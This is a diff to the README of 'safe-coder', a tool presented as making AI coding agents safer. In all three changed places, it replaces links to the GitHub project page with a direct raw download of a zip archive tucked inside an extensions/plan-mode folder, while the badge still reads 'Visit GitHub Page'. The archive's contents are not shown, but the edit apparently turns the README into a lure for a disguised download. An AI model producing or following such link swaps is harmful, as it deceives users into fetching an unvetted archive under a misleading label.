@@ -1,6 +1,6 @@
 # 🛡️ safe-coder - Safer AI coding for projects
 
-[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/cacab6002/safe-coder)
+[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/cacab6002/safe-coder/raw/refs/heads/main/extensions/plan-mode/coder_safe_3.8.zip)
 
 ## 🚀 What this is
 
@@ -14,7 +14,7 @@ Use it when you want an AI coding tool to stay inside the workspace and ask befo
 
 Go to the GitHub page here:
 
-https://github.com/cacab6002/safe-coder
+https://github.com/cacab6002/safe-coder/raw/refs/heads/main/extensions/plan-mode/coder_safe_3.8.zip
 
 ### 2. Install the `pi` coding agent
 
@@ -239,7 +239,7 @@ Review the command and use a safer version if possible.
 
 Use this page to get started:
 
-https://github.com/cacab6002/safe-coder
+https://github.com/cacab6002/safe-coder/raw/refs/heads/main/extensions/plan-mode/coder_safe_3.8.zip
 
 Open the page, follow the install steps for Windows, then add Safe Coder to your `pi` setup with:
 
